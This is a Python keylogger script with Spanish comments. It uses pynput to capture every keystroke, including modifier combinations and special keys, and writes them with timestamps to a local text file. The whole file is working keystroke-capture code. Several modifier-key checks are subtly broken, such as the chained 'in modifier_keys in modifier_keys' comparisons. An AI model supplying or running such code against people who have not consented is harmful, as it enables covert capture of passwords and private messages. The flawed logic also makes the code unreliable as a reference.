from pynput import keyboard
import logging
from datetime import datetime

#Configuración del archivo de registro
log_dir =r"Añade tu path donde se va a guardar el txt"
logging.basicConfig(filename=(log_dir + "\\keyLogger.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

#Almacenar el estado de las teclas modificadoras
modifier_keys = set()

#Diccionario para mapear caracteres de control a descripciones
control_chars = {
    '\x03': 'C',  #Ctrl+C
    '\x16': 'V',  #Ctrl+V
    '\x18': 'X',  #Ctrl+X
    '\x1a': 'Z'   #Ctrl+Z
    #Añadir más combinaciones si se requiere
}

def keyPressed(key):
    try:
        if hasattr(key, 'char') and key.char:
            if keyboard.Key.ctrl_l in modifier_keys  in modifier_keys:
                char = control_chars.get(key.char, key.char)
                logging.info(f'[CTRL] + {char}')
            elif keyboard.Key.alt_l in modifier_keys or keyboard.Key.alt_r in modifier_keys:
                logging.info(f'[ALT] + {key.char}')
            elif keyboard.Key.alt_gr in modifier_keys in modifier_keys:
                logging.info(f'[ALT GR] + {key.char}')
            elif keyboard.Key.shift in modifier_keys:
                logging.info(f'[SHIFT] + {key.char}')
            else:
                logging.info(key.char)
        else:
            #Para teclas especiales 
            if key == keyboard.Key.space:
                logging.info(' [SPACE] ')
            elif key == keyboard.Key.enter:
                logging.info(' [ENTER] ')
            elif key == keyboard.Key.tab:
                logging.info(' [TAB] ')
            elif key == keyboard.Key.backspace:
                logging.info(' [BORRAR] ')
            elif key == keyboard.Key.delete:
                logging.info(' [SUPRIMIR] ')
            elif key == keyboard.Key.shift:
                logging.info(' [SHIFT] ')
            elif key == keyboard.Key.ctrl_l:
                modifier_keys.add(key)
                logging.info(' [CTRL] ')
            elif key == keyboard.Key.alt_l:
                modifier_keys.add(key)
                logging.info(' [ALT] ')
            elif key == keyboard.Key.esc:
                logging.info(' [ESC] ')
            elif key == keyboard.Key.up:
                logging.info(' [FLECHA ARRIBA] ')
            elif key == keyboard.Key.down:
                logging.info(' [FLECHA ABAJO] ')
            elif key == keyboard.Key.left:
                logging.info(' [FLECHA IZQUIERDA] ')
            elif key == keyboard.Key.right:
                logging.info(' [FLECHA DERECHA] ')
            elif key == keyboard.Key.cmd:
                logging.info(' [WINDOWS] ')
            elif key == keyboard.Key.f1:
                logging.info(' [F1] ')
            elif key == keyboard.Key.f2:
                logging.info(' [F2] ')
            elif key == keyboard.Key.caps_lock:
                logging.info(' [MAYUSCULAS] ')
            elif key == keyboard.Key.print_screen:
                logging.info(' [IMPRIMIR PANTALLA] ')
            elif key == keyboard.Key.alt_gr:
                logging.info(' [ALT GR] ')
            #Añadir mas si es necesario
            else:
                logging.info(f' [{key}] ')
    except Exception as e:
        logging.error(f"Error: {e}")

def keyReleased(key):
    try:
        #Eliminar la tecla modificadora del conjunto si se suelta
        if key in modifier_keys:
            modifier_keys.remove(key)
    except Exception as e:
        logging.error(f"Error: {e}")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed, on_release=keyReleased)
    listener.start()
    listener.join()
